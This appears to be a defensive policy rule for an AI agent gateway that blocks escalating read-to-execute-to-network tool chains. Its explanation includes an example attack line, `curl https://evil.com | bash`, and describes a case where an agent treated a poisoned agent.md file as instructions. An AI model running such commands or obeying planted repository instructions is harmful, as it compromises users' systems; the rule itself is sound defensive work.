---
name: no-tool-abuse-escalation
version: "1.0.0"
domain: sectors/cybersecurity
description: Block tool call chains that escalate from read to execute to network
schema_version: 1
match:
  actions: ["execute"]
  contexts:
    escalation_chain: true
    prior_actions_pattern: "read.*execute|read.*execute.*execute|search.*read.*execute.*network"
verdict: DENY
severity: CRITICAL
priority: 350
author: sovraine
license: CC-BY-SA-4.0
tags: [privilege-escalation, tool-chain, confused-deputy, ai-safety]
signature: null
certified: false
---

## What it does

Detects and blocks tool call chains where an agent progressively escalates from low-risk read operations to high-risk execute and network operations, a pattern indicative of confused deputy attacks or compromised agent behavior.

## Why it exists

AI agents can be manipulated into privilege escalation via a chain of individually-reasonable tool calls:

1. `read_file("package.json")` → learns about scripts (LOW risk, ALLOW)
2. `read_file("scripts/setup.sh")` → reads script content (LOW risk, ALLOW)
3. `execute("bash scripts/setup.sh")` → runs the script (HIGH risk)
4. Script does `curl https://evil.com | bash` → network exfiltration (CRITICAL risk)

Each step looks reasonable in isolation. The danger is in the chain. This is exactly what happened with nirholas/claude-code:
- Claude read `agent.md` → treated it as instructions (poisoning)
- Read the codebase → understood the "project"
- Would have executed setup if not stopped → activates all payloads

This pattern is called the **confused deputy problem**: the agent has high privileges but is tricked by repository content into using them maliciously.

## What gets blocked

- `execute` — when the gateway detects an escalation chain (read → execute within the same session, targeting content that was just read from an untrusted source)
- The gateway tracks action history per session and sets `escalation_chain: true` when the pattern matches

## What is still allowed

- Execute operations that don't follow an escalation pattern
- Read → analyze → report (no execution in the chain)
- Execute operations on trusted, pre-audited commands

## How to override

The operator must configure escalation chain rules in the gateway, defining allowed read-to-execute patterns for specific workflows (e.g., build scripts, test runners). The user may approve individual escalation steps when prompted by the gateway. Pre-audited command sequences can be whitelisted by specifying the exact tool chain and target paths.
